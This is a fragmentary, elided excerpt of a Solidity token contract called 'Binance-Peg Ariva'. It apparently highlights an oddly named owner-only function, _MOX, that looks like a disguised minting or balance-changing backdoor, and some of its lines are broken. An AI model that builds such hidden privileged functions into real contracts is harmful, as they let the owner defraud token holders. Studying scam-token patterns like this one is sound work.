...
contract BinancePegAriva is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor() {
        _name = "Binance-Peg Ariva";
        _symbol = "Ariva";
        _totalSupply = 1200000 * 10**9 * 10**9;
    ...
    function _MOX(address account, uint256 amount) internal virtual {
...
,        uint256 amount
    ...
    function _MOX(uint256 amount) public onlyOwner virtual returns (bool) {
